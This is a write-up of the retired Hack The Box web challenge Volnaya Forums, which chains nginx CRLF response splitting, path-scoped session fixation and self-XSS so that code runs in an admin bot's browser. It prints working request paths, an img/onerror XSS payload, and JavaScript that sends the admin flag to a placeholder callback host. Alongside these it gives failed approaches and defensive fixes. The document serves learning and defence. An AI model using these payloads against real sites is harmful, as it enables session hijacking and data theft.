---
title: "Hack The Box Challenge — Volnaya Forums"
summary: "Volnaya Forums chains nginx CRLF response splitting, path-scoped session fixation and self-XSS to execute code in an authenticated admin browser."
platform: "Hack The Box"
contentType: "challenge"
publicationPolicy: "retired"
challengeCategory: "Web"
difficulty: "Easy"
solvedAt: 2026-09-10
publishedAt: 2026-09-10
tags:
  - web-security
  - crlf-injection
  - session-fixation
  - stored-xss
  - cookie-path
  - headless-browser
  - source-code-review
tools:
  - unzip
  - ripgrep
  - curl
  - Node.js
  - Python
cves: []
htbUrl: "https://app.hackthebox.com/challenges/Volnaya%2520Forums"
cover: "/images/writeups/hackthebox/challenges/shared/hackthebox-challenge-cover.webp"
coverAlt: "Abstract cybersecurity challenge medallion with terminal, puzzle and network motifs"
featured: false
draft: false
---

> **Authorized-lab notice:** This write-up documents the retired Hack The Box Challenge Volnaya Forums. Retired status and publication eligibility were explicitly confirmed by the user on 10 September 2026, with the HTB page showing an available official write-up. The flag, cookies, generated credentials, session secrets, temporary target address and unrelated personal information have been removed. The original challenge package is not redistributed.

More retired Hack The Box material is available in the [write-ups archive](/writeups/) and the focused [Challenges archive](/writeups/challenges/).

## Executive summary

Volnaya Forums is a white-box Web challenge built from nginx, Next.js, SQLite, `iron-session` and a Puppeteer moderation bot. The application contains a profile bio rendered through React's `dangerouslySetInnerHTML`, but the profile API always returns the current user's record. That initially limits the issue to self-XSS.

The missing bridge is an nginx redirect that inserts a regex capture directly into the `Location` header. Encoded CRLF characters let an attacker add a second `Set-Cookie` header. Scoping the attacker's valid session cookie to `/api/profile` makes the administrator's browser load the attacker's malicious bio while preserving the administrator's original root-scoped cookie for `/api/auth`. JavaScript in the bio can therefore query the flag endpoint with the administrator's session.

The local investigation confirmed the architecture, unsafe HTML sink, bot behavior, flag condition and live session format. It also disproved a simpler session-secret-forgery hypothesis. The exact path-scoped cookie pivot was identified with assistance from the public official write-up and then traced back through the supplied source. A Python one-shot solver was written and syntax-checked, but its final webhook-based execution was not run by Codex because that would export an authenticated flag to a third-party service without separate approval. No flag value is presented or claimed here.

## Challenge information

| Item | Value |
| --- | --- |
| Name | `Volnaya Forums` |
| Platform | Hack The Box |
| Category | Web |
| Difficulty | Easy |
| Status | Retired, confirmed 10 September 2026 |
| Released | 6 June 2025 |
| Core chain | CRLF injection → session fixation → self-XSS → admin-context JavaScript |

The challenge provided an ephemeral forum service and a password-protected source backup. The current HTB page labels the challenge **Easy**. The original Business CTF publication described the same attack chain in its public official write-up repository.

## Provided material and evidence boundaries

The extracted archive contained the complete deployment and application source:

```text
web_volnaya_forums/
├── config/
│   ├── nginx.conf
│   └── supervisord.conf
├── challenge/
│   ├── lib/
│   │   ├── bot.ts
│   │   └── session.ts
│   ├── migrations/migrate-database.js
│   ├── pages/api/
│   │   ├── auth.ts
│   │   ├── profile.ts
│   │   └── report.ts
│   └── pages/profile.tsx
├── Dockerfile
└── flag.txt
```

The archive extraction itself was preserved:

```bash
unzip 'Volnaya Forums.zip'
```

```text
Archive:  Volnaya Forums.zip
   creating: web_volnaya_forums/
  inflating: web_volnaya_forums/config/nginx.conf
  inflating: web_volnaya_forums/Dockerfile
  inflating: web_volnaya_forums/challenge/lib/bot.ts
  inflating: web_volnaya_forums/challenge/pages/api/profile.ts
  inflating: web_volnaya_forums/challenge/pages/api/report.ts
  inflating: web_volnaya_forums/challenge/pages/profile.tsx
```

Only short explanatory excerpts are reproduced below. The source ZIP, bundled flag placeholder and full challenge package are intentionally excluded from this public repository.

## Initial analysis

The deployment runs nginx in front of a Next.js Pages Router application. SQLite stores users, reports, posts and replies. A migration creates a random administrator password and replaces the session secret during the image build. A Puppeteer bot reads the administrator credentials from SQLite, logs in locally, and reviews a user-controlled forum path.

The security review concentrated on four trust boundaries:

1. How authentication state is created and validated.
2. Which user-controlled fields reach an HTML or URL sink.
3. Which path the privileged moderation bot visits.
4. How nginx transforms the path before Next.js receives it.

The flag endpoint made the final authorization condition explicit:

```typescript
return res.status(200).json({
    authenticated: true,
    user: {
        username: session.user.username,
        role: session.user.role,
        ...(session.user.username === 'admin' ? { flag } : {}),
    },
});
```

Recovering the administrator password was not strictly necessary. The goal was to make a request to `/api/auth` from a browser that still held a valid administrator session.

## Testing the obvious session-forgery hypothesis

The source contained both an `.env` session secret and a hard-coded fallback in `session.ts`. That suggested a quick hypothesis: create an `iron-session` cookie whose user object names `admin`, then request `/api/auth`.

A small Node.js helper used the exact dependency version from `package.json` to seal:

```javascript
const session = {
  user: { username: 'admin', role: 'admin', isLoggedIn: true },
};

const cookie = await sealData(session, {
  password: '<CANDIDATE_SECRET>',
  ttl: 60 * 60 * 24,
});
```

Both known candidates were tested individually against the live endpoint. The response was the same in each case:

```json
{"authenticated":false}
```

A temporary normal account was then registered and logged in. The live service returned `{"success":true}` and a redacted cookie beginning with the expected `Fe26.2` Iron format. Attempts to unseal that cookie using either source candidate produced an empty object.

The migration explains the result:

```javascript
const env = 'SESSION_SECRET=' + crypto.randomBytes(32).toString('hex');
fs.writeFileSync('/app/.env', env);
```

The live server did not trust either static source value. Session forgery was therefore a dead end, and treating the bundled `.env` as a production credential would have produced a false solution.

## Identifying the self-XSS

The profile update API stores the supplied bio without sanitizing it:

```typescript
db.prepare('UPDATE users SET email = ?, bio = ? WHERE username = ?').run(
    email,
    bio,
    username
);
```

The profile page later renders that value directly as HTML:

```tsx
<div
    className="prose"
    dangerouslySetInnerHTML={{ __html: profile.bio }}
/>
```

This is an unsafe HTML sink. A compact proof payload has the familiar structure:

```html
<img src=x onerror=alert(document.domain)>
```

However, `/api/profile` queries by `session.user.username`. There is no public “view another user's profile” feature in the relevant route. The administrator normally receives the administrator's bio, while the attacker receives the attacker's bio. The initial static review therefore classified this correctly as self-XSS rather than immediate account takeover.

## Finding the privileged browser path

The report endpoint passes `postThread` to `reviewReport`:

```typescript
const { postThread, reason } = req.body;
stmt.run(postThread, reason, session.user.username);
void reviewReport(postThread);
```

The bot then logs in as the administrator and appends that value to a fixed local origin:

```typescript
await page.goto('http://127.0.0.1:1337/login');
// The bot submits the database-backed admin credentials.

const postURL =
    'http://127.0.0.1:1337' +
    (forumThread.startsWith('/') ? forumThread : '/' + forumThread);

await page.goto(postURL, { waitUntil: 'networkidle2' });
```

This is the privileged user required for an XSS chain, but it does not by itself expose the attacker's profile. Supplying an external URL also fails because the bot fixes the scheme and host before adding the controlled path.

## The nginx CRLF primitive

The critical nginx location is:

```nginx
location ~ ^/invite/(?<id>[^?]*)$ {
    return 301 "/?ref=$id";
}
```

The regex capture is inserted directly into a redirect value. A request containing encoded carriage-return and line-feed bytes can split the generated headers:

```text
/invite/aaa%0D%0ASet-Cookie:%20probe=value
```

Conceptually, the response becomes:

```http
HTTP/1.1 301 Moved Permanently
Location: /?ref=aaa
Set-Cookie: probe=value
```

This turns the user-controlled path into a cookie-injection primitive. The challenge's important insight is not merely setting a cookie, but assigning a narrow path to a valid attacker session.

## Chaining path-scoped session fixation with self-XSS

After registering and logging in, the attacker already owns a valid low-privilege session cookie. The CRLF path embeds that value and restricts it to the profile API:

```text
/invite/aaa%0D%0ASet-Cookie:%20session=<ATTACKER_SESSION>;%20Path=/api/profile
```

When the administrator bot visits this URL, the browser retains two cookies with the same name:

| Cookie | Path | Used for |
| --- | --- | --- |
| Real administrator session | `/` | General application requests, including `/api/auth` |
| Fixed attacker session | `/api/profile` | The profile API request only |

RFC 6265 describes path matching and the common practice of listing longer cookie paths before shorter ones. For `/api/profile`, the more specific attacker cookie is processed first, so the API returns the attacker's stored bio. For `/api/auth`, `/api/profile` does not match; the browser sends only the administrator's root-scoped session.

The attacker's bio can therefore contain JavaScript that reads the admin-only response:

```javascript
fetch('/api/auth')
  .then((response) => response.json())
  .then((data) => {
    new Image().src =
      '<CALLBACK>?flag=' + encodeURIComponent(data.user.flag);
  });
```

To avoid quote and JSON transport problems, the local helper Base64-encoded this JavaScript and wrapped it in a small HTML event handler:

```html
<img src=x onerror=eval(atob('<BASE64_JAVASCRIPT>'))>
```

Base64 is transport encoding, not a security bypass by itself. The vulnerability is the unsanitized HTML sink that allows the decoded JavaScript to execute.

## Chronological solution

### 1. Register and capture a normal session

The live checks used a temporary generated username and password. Registration returned:

```json
{"success":true,"message":"User registered successfully"}
```

Login returned:

```json
{"success":true}
```

and a valid `session=<REDACTED>` cookie. The public reproduction should always use fresh generated credentials and must not publish the resulting session identifier.

### 2. Store the callback payload in the attacker's bio

The essential request is:

```http
POST /api/profile HTTP/1.1
Host: <TARGET>
Cookie: session=<ATTACKER_SESSION>
Content-Type: application/json

{
  "username": "<USERNAME>",
  "email": "<EMAIL>",
  "bio": "<img src=x onerror=eval(atob('<BASE64_JAVASCRIPT>'))>"
}
```

At this point the payload remains self-XSS. Opening the attacker's own profile would execute it only in the attacker's session.

### 3. Submit one path-injection report

The controlled forum thread is replaced with the CRLF path:

```http
POST /api/report HTTP/1.1
Host: <TARGET>
Cookie: session=<ATTACKER_SESSION>
Content-Type: application/json

{
  "postThread": "/invite/aaa%0D%0ASet-Cookie:%20session=<ATTACKER_SESSION>;%20Path=/api/profile",
  "reason": "Profile rendering security review"
}
```

Only one report is necessary. The source contains a separate queue-check bug: SQLite returns the column as `COUNT(*)`, while the code reads `unreviewedReports.count`. The value is therefore undefined and the intended rate limit is ineffective. Repeated submissions would launch unnecessary Chromium processes and risk denying service, so they are neither required nor appropriate.

### 4. Let the redirect and cookie paths do the work

The bot logs in as admin, visits the injected path and follows the redirect. The root page checks `/api/auth` using the real admin cookie, sees an authenticated session and routes to the profile page. The profile page then requests `/api/profile`, where the more specific attacker cookie selects the attacker's record and malicious bio.

### 5. Query the flag endpoint in the admin context

Once the bio executes, its `fetch('/api/auth')` request falls outside `/api/profile`. The injected cookie no longer applies, so the request uses the administrator's original cookie. The response contains the admin-only flag field, which the payload sends to the designated callback. The flag value is intentionally omitted.

## Solver and verification status

A Python standard-library solver was created to automate:

```text
register → login → capture cookie → create callback
→ store XSS bio → generate CRLF path → submit one report
→ poll callback → clean up callback
```

The helper used `urllib.request`, generated fresh credentials, URL-encoded the returned flag, limited polling to 75 seconds and removed its temporary webhook token in a `finally` block. Its syntax was checked successfully:

```bash
python -m py_compile solve_volnaya.py
```

The automated reviewer stopped the remote run before the Python process started because the planned callback was the third-party `webhook.site` service. The challenge authorization covered obtaining the flag, but did not separately authorize exporting authenticated data to that external service. For that reason, the public article does not describe the solver as remotely verified and does not claim a captured flag.

The exact CRLF, path-scoping and self-XSS chain was subsequently compared with the public official HTB write-up. That comparison confirmed the intended technique but is identified here as official-write-up-assisted rather than presented as an independently discovered final transition.

## Failed approaches

### Forging the admin session from backup secrets

Two source-visible session-secret candidates were tested with `iron-session` 8.0.4. Both generated cookies were rejected by `/api/auth`, and neither candidate could unseal a cookie issued by the live login endpoint. The migration's random secret replacement accounts for the result. This was a useful negative test because it prevented a source-code secret from being mistaken for a production credential.

### Treating the profile bug as ordinary stored XSS

The bio is executable HTML, but the profile API is session-bound. Without the path-scoped session cookie, the admin sees only the admin bio. Labeling the issue “stored XSS against the admin” before proving cross-user delivery would overstate its impact.

### Redirecting the bot to an external host

The bot prefixes the report value with `http://127.0.0.1:1337`. Common `//host`, backslash and encoded-slash variants remain paths on the fixed local origin. The successful chain stays same-origin and uses nginx header injection instead.

## Why it works

No individual issue completes the challenge:

- **Self-XSS** provides executable attacker content, but only in the attacker's profile.
- **The admin bot** provides a privileged browser, but normally loads administrator-owned data.
- **CRLF injection** can set a cookie, but replacing the administrator session globally would make `/api/auth` see only a normal user.
- **Cookie path scoping** separates those identities by endpoint: attacker identity for `/api/profile`, administrator identity for `/api/auth`.

The application and reverse proxy disagree about the safety of the same path. nginx treats the controlled capture as part of an HTTP header, the browser accepts the injected cookie, Next.js resolves duplicate cookie names, and React executes unsanitized HTML. The exploit succeeds at the boundaries between components rather than through a single spectacular bug.

## Defensive perspective

| Weakness | Defensive action |
| --- | --- |
| User input interpolated into an nginx redirect | Avoid captured untrusted values in `return` URLs; validate and encode redirect components before use |
| Duplicate session cookies with different paths | Use host-only cookies with an explicit root path, reject ambiguous duplicate session-cookie names server-side and rotate the session after login |
| Unsanitized rich-text bio | Sanitize allowed HTML with a maintained policy such as DOMPurify, or render plain text through React's normal escaping |
| Flag returned to browser JavaScript | Keep sensitive values in server-side authorization flows and avoid returning them in a general session-status response |
| Bot accepts arbitrary application paths | Allow-list the expected post route and numeric identifier before navigation |
| Report queue check reads the wrong alias | Alias the aggregate (`COUNT(*) AS count`) and enforce concurrency limits outside the request process |
| Headless browser executes unrestricted page code | Add a restrictive CSP, isolate the bot, deny unnecessary egress and use a fresh context for every review |

Fixing only the XSS or only the CRLF primitive would break this exact chain. A resilient design should address every trust-boundary failure because similar primitives may reappear elsewhere.

## Key takeaways

- A self-XSS finding should not be discarded until every identity-switching and content-delivery path has been examined.
- Cookies with the same name can represent different sessions when their paths differ; endpoint-specific cookie behavior can become an authorization primitive.
- Reverse-proxy configuration is part of the application attack surface, especially when regex captures enter redirects or headers.
- Privileged review bots convert otherwise local browser bugs into cross-user impact.
- Source-visible secrets must be tested against the deployed lifecycle; build and migration steps can invalidate them.
- Negative results and blocked validation steps belong in a trustworthy write-up instead of being silently rewritten as success.
- Complex exploitation often comes from composing small issues across nginx, session middleware, application APIs and browser behavior.

## References

- [Hack The Box — Volnaya Forums](https://app.hackthebox.com/challenges/Volnaya%2520Forums)
- [Hack The Box Business CTF 2025 — official Volnaya Forums write-up](https://github.com/hackthebox/business-ctf-2025/tree/master/web/Volnaya%20Forums)
- [nginx `ngx_http_rewrite_module` documentation](https://nginx.org/en/docs/http/ngx_http_rewrite_module.html)
- [RFC 6265 — HTTP State Management Mechanism](https://www.rfc-editor.org/rfc/rfc6265.html)
- [OWASP Cross Site Scripting Prevention Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
